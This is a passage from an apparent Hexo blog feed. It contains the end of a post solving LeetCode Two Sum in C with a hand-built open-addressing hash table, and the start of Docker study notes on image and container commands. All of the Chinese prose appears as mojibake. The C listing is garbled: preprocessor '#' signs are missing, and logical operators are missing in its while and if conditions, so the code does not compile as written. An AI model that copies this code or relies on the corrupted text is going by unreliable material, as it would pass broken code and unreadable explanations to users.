class="comment">Â &#125;**/</span></span><br></pre></td></tr></table></figure><h4 id="è¡¥å……-HashMap"><a href="#è¡¥å……-HashMap" class="headerlink" title="è¡¥å……-HashMap"></a>è¡¥å……-HashMap</h4><p>å“ˆå¸Œå‡½æ•°çš„å†™æ³•æœ‰å¾ˆå¤šä¸­ï¼Œæˆ‘ä»¬æ¥çœ‹çœ‹<strong>ã€ŒHashMapã€</strong>ä¸­çš„å“ˆå¸Œå‡½æ•°<strong>[java]</strong>Â  Â  Â </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> final <span class="type">int</span> <span class="title function_">hash</span><span class="params">(Object key)</span> &#123;   Â </span><br><span class="line"><span class="type">int</span> h;  </span><br><span class="line">Â  Â  <span class="keyword">return</span> (key == null) ? <span class="number">0</span> : (h = key.hashCode()) ^ (h &gt;&gt;&gt; <span class="number">16</span>);  </span><br><span class="line">Â  Â  &#125;</span><br></pre></td></tr></table></figure><p><strong>ã€ŒHashMapã€</strong>ä¸­åˆ©ç”¨äº†<strong>ã€ŒhashCodeã€</strong>æ¥å®Œæˆè¿™ä¸ªè½¬æ¢ã€‚å“ˆå¸Œå‡½æ•°ä¸ç®¡æ€ä¹ˆå®ç°ï¼Œéƒ½åº”è¯¥æ»¡è¶³ä¸‹é¢ä¸‰ä¸ªåŸºæœ¬æ¡ä»¶ï¼š</p><ul><li>æ•£åˆ—å‡½æ•°è®¡ç®—å¾—åˆ°çš„æ•£åˆ—å€¼æ˜¯ä¸€ä¸ªéè´Ÿæ•´æ•°</li><li>å¦‚æœ key1 &#x3D; key2ï¼Œé‚£ hash(key1) &#x3D;&#x3D; hash(key2)</li><li>å¦‚æœ key1 â‰  key2ï¼Œé‚£ hash(key1) â‰  hash(key2)</li></ul><p>ç¬¬ä¸€ç‚¹ï¼šå› ä¸ºæ•°ç»„çš„ä¸‹æ ‡æ˜¯ä»0å¼€å§‹ï¼Œæ‰€ä»¥å“ˆå¸Œå‡½æ•°ç”Ÿæˆçš„å“ˆå¸Œå€¼ä¹Ÿåº”è¯¥æ˜¯éè´Ÿæ•°</p><p>ç¬¬äºŒç‚¹ï¼šåŒä¸€ä¸ªkeyç”Ÿæˆçš„å“ˆå¸Œå€¼åº”è¯¥æ˜¯ä¸€æ ·çš„ï¼Œå› ä¸ºæˆ‘ä»¬éœ€è¦é€šè¿‡keyæŸ¥æ‰¾å“ˆå¸Œè¡¨ä¸­çš„æ•°æ®</p><p>ç¬¬ä¸‰ç‚¹ï¼šçœ‹èµ·æ¥éå¸¸åˆç†ï¼Œä½†æ˜¯ä¸¤ä¸ªä¸ä¸€æ ·çš„å€¼é€šè¿‡å“ˆå¸Œå‡½æ•°ä¹‹åå¯èƒ½æ‰ç”Ÿç›¸åŒçš„å€¼ï¼Œå› ä¸ºæˆ‘ä»¬æŠŠå·¨å¤§çš„ç©ºé—´è½¬å‡ºæˆè¾ƒå°çš„æ•°ç»„ç©ºé—´æ—¶ï¼Œä¸èƒ½ä¿è¯æ¯ä¸ªæ•°å­—éƒ½æ˜ å°„åˆ°æ•°ç»„ç©ºç™½å¤„ã€‚æ‰€ä»¥è¿™é‡Œå°±ä¼šæ‰ç”Ÿå†²çªï¼Œåœ¨å“ˆå¸Œè¡¨ä¸­æˆ‘ä»¬ç§°ä¹‹ä¸ºå“ˆå¸Œå†²çªã€‚æˆ‘ä»¬å¸¸ç”¨è§£å†³å“ˆå¸Œå†²çªçš„æ–¹æ³•æœ‰ä¸¤ç§<strong>ã€Œå¼€æ”¾åœ°å€æ³•ã€</strong>å’Œ<strong>ã€Œé“¾è¡¨æ³•ã€</strong></p><p>æ€»çš„æ¥è¯´hashmapå°±æ˜¯å¯ä»¥å®ç°ä¸€æ¬¡æŸ¥æ‰¾ï¼Œå¯¹äºè¿™é“é¢˜ï¼Œæˆ‘ä»¬å€ŸåŠ©hashmapå°±å¯ä»¥å®ç°åœ¨çº¿æ€§æ—¶é—´å†…æ‰¾åˆ°ç­”æ¡ˆã€‚</p><h6 id="æ€è·¯-1"><a href="#æ€è·¯-1" class="headerlink" title="æ€è·¯"></a>æ€è·¯</h6><p>éå†æ•°ç»„æ—¶ï¼Œæˆ‘ä»¬å¯ä»¥æ£€æŸ¥ç›®æ ‡å€¼ä¸å½“å‰æ•°å­—çš„å·®æ˜¯å¦å·²ç»åœ¨å“ˆå¸Œè¡¨ä¸­å­˜åœ¨ï¼Œå¦‚æœå­˜åœ¨ï¼Œè¯´æ˜æˆ‘ä»¬å·²ç»æ‰¾åˆ°äº†ä¸¤ä¸ªæ•°çš„å’Œç­‰äºç›®æ ‡å€¼ã€‚</p><p>è¿™æ ·ï¼Œæˆ‘ä»¬åªéœ€è¦æœ€å¤šæŠŠæ‰€æœ‰numéå†ä¸€éï¼Œå°±å¯ä»¥å‡ºç»“æœã€‚</p><h6 id="æµç¨‹"><a href="#æµç¨‹" class="headerlink" title="æµç¨‹"></a>æµç¨‹</h6><ul><li>éœ€è¦æŠŠæ•°å­—çš„å€¼å’Œä¸‹æ ‡éƒ½å­˜åˆ°hashè¡¨ä¸­</li><li>ç„¶åä»ç¬¬ä¸€ä¸ªå¼€å§‹æ‰¾ï¼Œæ‰¾åˆ°äº†å°±è¿”å›è¯¥æ•°å­—ä¸‹æ ‡å’Œé‚£ä¸ªå·®çš„ä¸‹æ ‡</li></ul><hr><p>ä¸Šé¢çš„è¿˜æ˜¯ä¸å¤ªå¥½ï¼Œä¸‹é¢æ˜¯ç½‘ä¸Šå›¾è§£</p><p><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/image-20230818151848875-1-1024x593.png"></p><p><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/image-20230818151905417-1-1024x633.png"></p><h6 id="å®ç°"><a href="#å®ç°" class="headerlink" title="å®ç°"></a>å®ç°</h6><figure class="highlight c"><figcaption><span>â€‹Â â€‹</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><span class="line">include &lt;stdio.h&gt;  </span><br><span class="line"></span><br><span class="line">include &lt;stdlib.h&gt;  </span><br><span class="line"></span><br><span class="line">define HashSize <span class="number">20000</span>  </span><br><span class="line"></span><br><span class="line">Â <span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span>  </span><br><span class="line">Â  Â  Â <span class="type">int</span> key;  </span><br><span class="line">Â  Â  Â <span class="type">int</span> value;  </span><br><span class="line">Â  Â  Â <span class="type">int</span> used;  </span><br><span class="line">Â &#125; HashEntry;  </span><br><span class="line">Â â€‹  </span><br><span class="line">Â <span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span>  </span><br><span class="line">Â  Â  Â HashEntry\* data;  </span><br><span class="line">Â  Â  Â <span class="type">int</span> size; Â  Â <span class="comment">//hashbiaoé•¿åº¦  </span></span><br><span class="line">Â &#125; HashMap;  </span><br><span class="line">Â HashMap\* createHashMap(<span class="type">int</span> size) &#123;  </span><br><span class="line">Â  Â  Â HashMap\* <span class="built_in">map</span> = (HashMap\*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(HashMap));  </span><br><span class="line">Â  Â  Â <span class="built_in">map</span>-&gt;data = (HashEntry\*)<span class="built_in">calloc</span>(size, <span class="keyword">sizeof</span>(HashEntry));  </span><br><span class="line">Â  Â  Â <span class="built_in">map</span>-&gt;size = size;  </span><br><span class="line">Â  Â  Â <span class="comment">//for (int i = 0; i &lt; size; i++) &#123;  </span></span><br><span class="line">Â  Â  Â <span class="comment">// Â  map-&gt;data\[i\].used = 0; // åˆå§‹åŒ–ä¸ºæœªä½¿ç”¨  </span></span><br><span class="line">Â  Â  Â <span class="comment">//&#125;  </span></span><br><span class="line">Â  Â  Â <span class="keyword">return</span> <span class="built_in">map</span>;  </span><br><span class="line">Â &#125;  </span><br><span class="line">Â <span class="type">void</span> <span class="title function_">insert</span><span class="params">(HashMap\* <span class="built_in">map</span>, <span class="type">int</span> key, <span class="type">int</span> value)</span> &#123;  </span><br><span class="line">Â  Â  Â <span class="type">int</span> hash = <span class="built_in">abs</span>(value) % <span class="built_in">map</span>-&gt;size;  </span><br><span class="line">Â  Â  Â <span class="keyword">while</span> (<span class="built_in">map</span>-&gt;data\[hash\].used <span class="built_in">map</span>-&gt;data\[hash\].value != <span class="number">0</span>) &#123;  </span><br><span class="line">Â  Â  Â  Â  Â hash = <span class="built_in">abs</span>(hash + <span class="number">1</span>) % <span class="built_in">map</span>-&gt;size;  </span><br><span class="line">Â  Â  &#125;  </span><br><span class="line">Â  Â  Â <span class="built_in">map</span>-&gt;data\[hash\].key = key;  </span><br><span class="line">Â  Â  Â <span class="built_in">map</span>-&gt;data\[hash\].value = value;  </span><br><span class="line">Â  Â  Â <span class="built_in">map</span>-&gt;data\[hash\].used = <span class="number">1</span>; <span class="comment">// æ ‡è®°ä¸ºå·²ä½¿ç”¨  </span></span><br><span class="line">Â &#125;  </span><br><span class="line">Â <span class="type">int</span>\* twoSum(<span class="type">int</span>\* nums, <span class="type">int</span> numsSize, <span class="type">int</span> target, <span class="type">int</span>\* returnSize) &#123;  </span><br><span class="line"></span><br><span class="line">Â  Â  Â HashMap\* <span class="built_in">map</span> = createHashMap(HashSize);  </span><br><span class="line">Â â€‹  </span><br><span class="line">Â  Â  Â <span class="type">int</span>\* result = (<span class="type">int</span>\*)<span class="built_in">malloc</span>(<span class="number">2</span> \* <span class="keyword">sizeof</span>(<span class="type">int</span>));  </span><br><span class="line">Â  Â  Â \*returnSize = <span class="number">2</span>;  </span><br><span class="line">Â  Â  Â <span class="type">int</span> i;  </span><br><span class="line">Â  Â  Â <span class="type">int</span> hash;  </span><br><span class="line">Â  Â  Â <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; numsSize; i++) &#123;  </span><br><span class="line">Â  Â  Â  Â  Â <span class="type">int</span> complement = target - nums\[i\];  </span><br><span class="line"></span><br><span class="line">Â  Â  Â  Â  Â hash = <span class="built_in">abs</span>(complement) % HashSize;  </span><br><span class="line">Â â€‹  </span><br><span class="line">Â  Â  Â  Â  Â <span class="keyword">if</span> (<span class="built_in">map</span>-&gt;data\[hash\].used <span class="built_in">map</span>-&gt;data\[hash\].value != <span class="number">0</span>) &#123;  </span><br><span class="line">Â  Â  Â  Â  Â  Â  Â <span class="keyword">while</span> (<span class="built_in">map</span>-&gt;data\[hash\].value != complement) &#123;  </span><br><span class="line"></span><br><span class="line">Â  Â  Â  Â  Â  Â  Â  Â  Â hash = (hash + <span class="number">1</span>) % HashSize;  </span><br><span class="line">Â  Â  Â  Â  Â  Â  Â  Â  Â <span class="keyword">if</span> ((<span class="built_in">map</span>-&gt;data\[hash\].used ==<span class="number">0</span>) &amp;&amp; (<span class="built_in">map</span>-&gt;data\[hash\].value == <span class="number">0</span>)) &#123;  </span><br><span class="line">Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â insert(<span class="built_in">map</span>, i, nums\[i\]);  </span><br><span class="line">Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â <span class="keyword">break</span>; Â <span class="comment">// æ’å…¥åè·³å‡ºå¾ªç¯  </span></span><br><span class="line">Â  Â  Â  Â  Â  Â  Â  Â  &#125;  </span><br><span class="line">Â  Â  Â  Â  Â  Â  Â  Â  Â <span class="keyword">if</span> (<span class="built_in">map</span>-&gt;data\[hash\].value == complement) &#123;  </span><br><span class="line">Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â result\[<span class="number">0</span>\] = i;  </span><br><span class="line">Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â result\[<span class="number">1</span>\] = <span class="built_in">map</span>-&gt;data\[hash\].key;  </span><br><span class="line">Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â <span class="built_in">free</span>(<span class="built_in">map</span>-&gt;data);  </span><br><span class="line">Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â <span class="built_in">free</span>(<span class="built_in">map</span>);  </span><br><span class="line">Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â <span class="keyword">return</span> result;  </span><br><span class="line">Â  Â  Â  Â  Â  Â  Â  Â  &#125;  </span><br><span class="line">Â  Â  Â  Â  Â  Â  &#125;  </span><br><span class="line">Â  Â  Â  Â  Â  Â  Â <span class="keyword">if</span> (<span class="built_in">map</span>-&gt;data\[hash\].value == complement) &#123;  </span><br><span class="line">Â  Â  Â  Â  Â  Â  Â  Â  Â result\[<span class="number">0</span>\] = i;  </span><br><span class="line">Â  Â  Â  Â  Â  Â  Â  Â  Â result\[<span class="number">1</span>\] = <span class="built_in">map</span>-&gt;data\[hash\].key;  </span><br><span class="line">Â  Â  Â  Â  Â  Â  Â  Â  Â <span class="built_in">free</span>(<span class="built_in">map</span>-&gt;data);  </span><br><span class="line">Â  Â  Â  Â  Â  Â  Â  Â  Â <span class="built_in">free</span>(<span class="built_in">map</span>);  </span><br><span class="line">Â  Â  Â  Â  Â  Â  Â  Â  Â <span class="keyword">return</span> result;  </span><br><span class="line">Â  Â  Â  Â  Â  Â  &#125;  </span><br><span class="line">Â  Â  Â  Â  &#125;  </span><br><span class="line">Â  Â  Â  Â  Â <span class="keyword">else</span> &#123;  </span><br><span class="line">Â  Â  Â  Â  Â  Â  Â insert(<span class="built_in">map</span>, i, nums\[i\]);  </span><br><span class="line">Â  Â  Â  Â  &#125;  </span><br><span class="line">Â  Â  &#125;  </span><br><span class="line">Â â€‹  </span><br><span class="line">Â  Â  Â <span class="built_in">free</span>(<span class="built_in">map</span>-&gt;data);  </span><br><span class="line">Â  Â  Â <span class="built_in">free</span>(<span class="built_in">map</span>);  </span><br><span class="line">Â  Â  Â <span class="keyword">return</span> result;  </span><br><span class="line">Â  Â  Â <span class="comment">//free(result);  </span></span><br><span class="line">Â &#125;  </span><br><span class="line"></span><br></pre></td></tr></table></figure><p>äººéº»äº†ã€‚ã€‚</p><h6 id="æ³¨æ„"><a href="#æ³¨æ„" class="headerlink" title="æ³¨æ„"></a>æ³¨æ„</h6><ul><li>æ³¨æ„hashè¡¨çš„åˆ¤æ–­é€»è¾‘ï¼Œåˆå§‹åŒ–0å’Œèµ‹å€¼ä¸º0æ³¨æ„åŒºåˆ†ï¼Œéœ€è¦ä¸€ä¸ªusedåˆ¤æ–­ç¬¦å·æ¥åˆ¤æ–­</li><li>ä¼˜åŒ–çš„è¯hashè¡¨ç”¨é“¾è¡¨ï¼Œä¹Ÿè®¸å¯ä»¥ä¼˜åŒ–ç©ºé—´ï¼Ÿ</li><li>Cè¯­è¨€å†™ç®—æ³•å¤ªé¸¡è‚‹äº†ï¼Œèµ¶å¿«æ¢è¯­è¨€ï¼</li></ul>]]></content>
      
      
      <categories>
          
          <category> ç®—æ³• </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ç®—æ³• </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Docker</title>
      <link href="/2023/07/25/docker/"/>
      <url>/2023/07/25/docker/</url>
      
        <content type="html"><![CDATA[<h3 id="Dockerå­¦ä¹ è·¯çº¿"><a href="#Dockerå­¦ä¹ è·¯çº¿" class="headerlink" title="Dockerå­¦ä¹ è·¯çº¿"></a>Dockerå­¦ä¹ è·¯çº¿</h3><ul><li>Dockeræ¦‚è¿°</li><li>Dockerå®‰è£…</li><li>Dockerå‘½ä»¤</li><li>é•œåƒå‘½ä»¤</li><li>å®¹å™¨å‘½ä»¤</li><li>æ“ä½œå‘½ä»¤</li><li>Â·Â·Â·</li><li>Dockeré•œåƒ</li><li>å®¹å™¨æ•°æ®å·</li><li>DockerFile</li><li>Dockerç½‘ç»œåŸç†</li><li>IDEAæ•´åˆDocker</li><li>Docker Compose</li><li>Docker Swarm</li></ul><h3 id="Dockeræ¦‚è¿°"><a href="#Dockeræ¦‚è¿°" class="headerlink" title="Dockeræ¦‚è¿°"></a>Dockeræ¦‚è¿°</h3><h5 id="Dockerèƒ½å¹²å˜›"><a href="#Dockerèƒ½å¹²å˜›" class="headerlink" title="Dockerèƒ½å¹²å˜›"></a>Dockerèƒ½å¹²å˜›</h5><p>è™šæ‹ŸæœºæŠ€æœ¯ç¼ºç‚¹ï¼š</p><ul><li>èµ„æºå ç”¨éå¸¸å¤š</li><li>å†—ä½™æ­¥éª¤å¤š</li><li>å¯åŠ¨æ…¢</li></ul><p>å®¹å™¨åŒ–æŠ€æœ¯ï¼š</p><ul><li><strong>ä¸æ˜¯æ¨¡æ‹Ÿçš„ä¸€ä¸ªå®Œæ•´çš„æ“ä½œç³»ç»Ÿ</strong></li><li>ä¼ ç»Ÿè™šæ‹Ÿæœºï¼Œè™šæ‹Ÿå‡ºä¸€æ¡ç¡¬ä»¶ï¼Œè¿è¡Œä¸€ä¸ªå®Œæ•´çš„æ“ä½œç³»ç»Ÿï¼Œç„¶ååœ¨è¿™ä¸ªç³»ç»Ÿä¸Šå®‰è£…å’Œè¿è¡Œè½¯ä»¶ï¼Œè€Œå®¹å™¨æŠ€æœ¯ï¼Œæ˜¯æŠŠåº”ç”¨ç›´æ¥è¿è¡Œåœ¨å®¿ä¸»æœºä¸Šï¼Œå®¹å™¨æ˜¯æ²¡æœ‰è‡ªå·±çš„å†…æ ¸çš„ï¼Œä¹Ÿæ²¡æœ‰è™šæ‹Ÿç¡¬ä»¶</li><li>æ¯ä¸ªå®¹å™¨ä¹‹é—´ç›¸äº’éš”ç¦»ï¼Œæ¯ä¸ªå®¹å™¨ä¹‹é—´éƒ½æœ‰å±äºè‡ªå·±çš„æ–‡ä»¶ç³»ç»Ÿï¼Œäº’ä¸å½±å“ã€‚</li></ul><h3 id="Dockerå®‰è£…"><a href="#Dockerå®‰è£…" class="headerlink" title="Dockerå®‰è£…"></a>Dockerå®‰è£…</h3><h5 id="Dockerçš„åŸºæœ¬ç»„æˆ"><a href="#Dockerçš„åŸºæœ¬ç»„æˆ" class="headerlink" title="Dockerçš„åŸºæœ¬ç»„æˆ"></a>Dockerçš„åŸºæœ¬ç»„æˆ</h5><p><img src="http://psych.green/wp-content/uploads/2023/07/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20230725163531-1024x529.png"></p><p>å®¢æˆ·ç«¯-æœåŠ¡å™¨-ä»“åº“</p><h6 id="é•œåƒ-image"><a href="#é•œåƒ-image" class="headerlink" title="é•œåƒ(image)"></a>é•œåƒ(image)</h6><p>Dockeré•œåƒå¥½æ¯”ä¸€ä¸ªæ¨¡æ¿ï¼Œå¯ä»¥é€šè¿‡è¿™ä¸ªæ¨¡æ¿æ¥åˆ›å»ºå®¹å™¨æœåŠ¡ï¼Œæ¯”å¦‚Tomcaté•œåƒ&#x3D;ã€‹run&#x3D;ã€‹Tomcatå®¹å™¨ã€‚é€šè¿‡ä¸€ä¸ªé•œåƒå¯ä»¥åˆ›å»ºå¤šä¸ªå®¹å™¨ï¼Œè€Œæœ€ç»ˆçš„æœåŠ¡é¡¹ç›®æ˜¯è¿è¡Œåœ¨å®¹å™¨ä¸­çš„ã€‚</p><h6 id="å®¹å™¨-container"><a href="#å®¹å™¨-container" class="headerlink" title="å®¹å™¨(container)"></a>å®¹å™¨(container)</h6><p>Dockeråˆ©ç”¨å®¹å™¨æŠ€æœ¯ï¼Œç‹¬ç«‹è¿è¡Œä¸€ä¸ªæˆ–è€…ä¸€ç»„åº”ç”¨ï¼Œé€šè¿‡é•œåƒæ¥åˆ›å»ºã€‚å®¹å™¨å¯ä»¥å¯åŠ¨ï¼Œåœæ­¢ï¼Œåˆ é™¤ç­‰ã€‚ç›®å‰å¯ä»¥æŠŠå®¹å™¨ç†è§£ä¸ºä¸€ä¸ªç®€æ˜“çš„linuxç³»ç»Ÿã€‚</p><h6 id="ä»“åº“-repository"><a href="#ä»“åº“-repository" class="headerlink" title="ä»“åº“(repository)"></a>ä»“åº“(repository)</h6><p>Dockerä»“åº“å°±æ˜¯å­˜æ”¾é•œåƒçš„åœ°æ–¹ï¼Œä»“åº“åˆ†ä¸ºå…±æœ‰ä»“åº“å’Œç§æœ‰ä»“åº“ã€‚Docker hubï¼Œé˜¿é‡Œäº‘Â·Â·Â·éƒ½æœ‰å®¹å™¨æœåŠ¡å™¨(é…ç½®é•œåƒåŠ é€Ÿ)ã€‚</p><h6 id="Dockeråº•å±‚åŸç†"><a href="#Dockeråº•å±‚åŸç†" class="headerlink" title="Dockeråº•å±‚åŸç†"></a>Dockeråº•å±‚åŸç†</h6><p>Dockeræ˜¯ä¸€ä¸ªclient-serverç»“æ„çš„ç³»ç»Ÿï¼ŒDockerçš„å®ˆæŠ¤è¿›ç¨‹è¿è¡Œåœ¨ä¸»æœºä¸Šï¼Œé€šè¿‡Socketä»å®¢æˆ·ç«¯è®¿é—®ã€‚</p><p>DockerSever æ¥æ”¶åˆ°Dockerâ€“Clientçš„æŒ‡ä»¤ï¼Œå°±ä¼šæ‰§è¡Œè¿™ä¸ªå‘½ä»¤ã€‚</p><h3 id="Dockerçš„å¸¸ç”¨å‘½ä»¤"><a href="#Dockerçš„å¸¸ç”¨å‘½ä»¤" class="headerlink" title="Dockerçš„å¸¸ç”¨å‘½ä»¤"></a>Dockerçš„å¸¸ç”¨å‘½ä»¤</h3><hr><h5 id="å¸®åŠ©å‘½ä»¤"><a href="#å¸®åŠ©å‘½ä»¤" class="headerlink" title="å¸®åŠ©å‘½ä»¤"></a>å¸®åŠ©å‘½ä»¤</h5><hr><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">docker version       #æ˜¾ç¤ºdockerçš„ç‰ˆæœ¬ä¿¡æ¯</span><br><span class="line">docker info          #æ˜¾ç¤ºdockerçš„ç³»ç»Ÿä¿¡æ¯ï¼ŒåŒ…æ‹¬å®¹å™¨å’Œé•œåƒçš„æ•°é‡</span><br><span class="line">docker å‘½ä»¤ --help   #å¸®åŠ©å‘½ä»¤</span><br></pre></td></tr></table></figure><p>å¸®åŠ©æ–‡æ¡£çš„åœ°å€: <a href="https://docs.docker.com/engine/reference/">https://docs.docker.com/engine/reference/</a> å³ä¾§çš„command-line</p><h5 id="é•œåƒå‘½ä»¤"><a href="#é•œåƒå‘½ä»¤" class="headerlink" title="é•œåƒå‘½ä»¤"></a>é•œåƒå‘½ä»¤</h5><hr><p><code>docker images</code> æŸ¥çœ‹æ‰€æœ‰æœ¬åœ°ä¸»æœºä¸Šçš„é•œåƒ</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">#å¯é€‰é¡¹ï¼š</span><br><span class="line">-a --all     #åˆ—å‡ºæ‰€æœ‰çš„é•œåƒ</span><br><span class="line">-q --quiet   #åªæ˜¾ç¤ºé•œåƒçš„id</span><br></pre></td></tr></table></figure><p><code>docker search</code> æœç´¢é•œåƒ</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#å¯é€‰é¡¹ï¼Œé€šè¿‡éšè—æ¥è¿‡æ»¤</span><br><span class="line">--filter=STARS=3000     #æœç´¢å‡ºæ¥çš„é•œåƒå°±æ˜¯STARSå¤§äº3000çš„ï¼Œä¹Ÿå°±æ˜¯ä¸‹è½½é‡æ¯”è¾ƒé«˜çš„é•œåƒäº†</span><br></pre></td></tr></table></figure><p><code>docker pull</code> ä¸‹è½½é•œåƒ</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">docker pull é•œåƒå[:tag]</span><br><span class="line">å¦‚æœä¸åŠ tagå°±æ˜¯ï¼Œé»˜è®¤ä¸‹è½½æœ€æ–°ç‰ˆæœ¬ï¼Œlatest</span><br><span class="line">#æŒ‡å®šç‰ˆæœ¬ä¸‹è½½: docker pull mysql:5.7    ---æ³¨æ„è¿™ä¸ªç‰ˆæœ¬ä¸€å®šæ˜¯docker hubé‡Œé¢å†™æ”¯æŒäº†ï¼Œä¸æ˜¯è‡ªå·±æƒ³å†™ä»€ä¹ˆä»€ä¹ˆ</span><br><span class="line"></span><br><span class="line">#ä¸‹è½½æ˜¯åˆ†å±‚ä¸‹è½½ï¼Œè¿™æ˜¯docker imageçš„æ ¸å¿ƒ è”åˆæ–‡ä»¶ç³»ç»Ÿ</span><br></pre></td></tr></table></figure><p><code>docker rmi</code> åˆ é™¤é•œåƒ â€“è¿™ä¸ªiå°±æ˜¯æŒ‡çš„imagesï¼Œæ‰€ä»¥æ˜¯åˆ é™¤é•œåƒ</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#å…¨éƒ¨åˆ é™¤ï¼š</span><br><span class="line">docker rmi -f $(docker images -aq)    #åé¢è¿”å›æ‰€æœ‰çš„imagesçš„ID</span><br></pre></td></tr></table></figure><h5 id="å®¹å™¨å‘½ä»¤"><a href="#å®¹å™¨å‘½ä»¤" class="headerlink" title="å®¹å™¨å‘½ä»¤"></a>å®¹å™¨å‘½ä»¤</h5><hr><p>è¯´æ˜ï¼šæœ‰äº†é•œåƒæ‰ä¼šæœ‰å®¹å™¨ï¼Œä»¥centosä¸ºä¾‹</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker pull centos</span><br></pre></td></tr></table></figure><h6 id="æ–°å»ºå®¹å™¨å¹¶å¯åŠ¨"><a href="#æ–°å»ºå®¹å™¨å¹¶å¯åŠ¨" class="headerlink" title="æ–°å»ºå®¹å™¨å¹¶å¯åŠ¨"></a>æ–°å»ºå®¹å™¨å¹¶å¯åŠ¨</h6><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">docker run [å¯é€‰å‚æ•°] image</span><br><span class="line">#å‚æ•°è¯´æ˜</span><br><span class="line">--name=&#x27;NAME&#x27;         å®¹å™¨åå­— </span><br><span class="line">-d                    åå°æ–¹å¼è¿è¡Œ</span><br><span class="line">-P                    æŒ‡å®šå®¹å™¨çš„ç«¯å£</span><br><span class="line">   -P   ip:ä¸»æœºç«¯å£:å®¹å™¨ç«¯å£</span><br><span class="line">   -P   ä¸»æœºç«¯å£:å®¹å™¨ç«¯å£</span><br><span class="line">   å®¹å™¨ç«¯å£</span><br><span class="line">-p                    éšæœºåˆ¶å®šç«¯å£</span><br><span class="line"></span><br><span class="line">#æµ‹è¯•  å¯åŠ¨å¹¶è¿›å…¥å®¹å™¨</span><br><span class="line">&gt;docker run -it centos /bin/bash</span><br></pre></td></tr></table></figure><h6 id="åˆ—å‡ºæ‰€æœ‰è¿è¡Œçš„å®¹å™¨"><a href="#åˆ—å‡ºæ‰€æœ‰è¿è¡Œçš„å®¹å™¨" class="headerlink" title="åˆ—å‡ºæ‰€æœ‰è¿è¡Œçš„å®¹å™¨"></a>åˆ—å‡ºæ‰€æœ‰è¿è¡Œçš„å®¹å™¨</h6><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">docker ps   </span><br><span class="line">-a              #åˆ—å‡ºå½“å‰æ­£åœ¨è¿è¡Œçš„æ‰€æœ‰å®¹å™¨+å¸¦å‡ºå†å²è¿è¡Œè¿‡çš„å®¹å™¨</span><br><span class="line">-n=numbers      